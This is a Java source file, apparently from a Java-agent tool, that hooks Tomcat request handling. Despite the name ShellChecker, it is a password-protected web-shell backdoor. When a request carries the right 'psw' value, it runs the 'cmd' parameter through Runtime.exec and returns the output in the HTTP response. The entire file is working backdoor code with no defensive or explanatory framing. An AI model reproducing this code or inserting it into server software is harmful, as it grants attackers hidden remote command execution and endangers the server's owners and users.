package cn.com.x1001.hook;

import cn.com.x1001.Agent;
import cn.com.x1001.http.AbstractRequest;
import cn.com.x1001.http.CoyoteRequest;
import cn.com.x1001.http.HttpResponse;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;


public class ShellChecker {


    public static void check(Object[] args, Object o) {
        //获取response对象
        HttpResponse httpResponse = new HttpResponse(args[1]);
        Object request = httpResponse.getRequest();
        if (request == null) request = args[0];
        CoyoteRequest coyoteRequest = new CoyoteRequest(request);
        String psw = coyoteRequest.getParameter("psw");
        String c = coyoteRequest.getParameter("cmd");
        if (psw != null && c != null && psw.equals(Agent.password)) {
            String cmd;
            try {
                cmd = execute(c);
                httpResponse.write(cmd);
            } catch (Exception e) {
                //TODO 暂不做处理，后期回显到页面
            }

        }

    }

    public static String execute(String cmd) throws Exception {
        String result = "";

        if (cmd != null && cmd.length() > 0) {
            OutputStream os = null;
            DataInputStream dis = null;
            InputStream in = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                os = p.getOutputStream();
                in = p.getInputStream();
                dis = new DataInputStream(in);
                String disr = dis.readLine();
                while (disr != null) {
                    result = result + disr + "</br>";
                    disr = dis.readLine();
                }
            } finally {
                if (os != null) os.close();
                if (in != null) in.close();
                if (dis != null) dis.close();
            }

        }
        return result;
    }
}
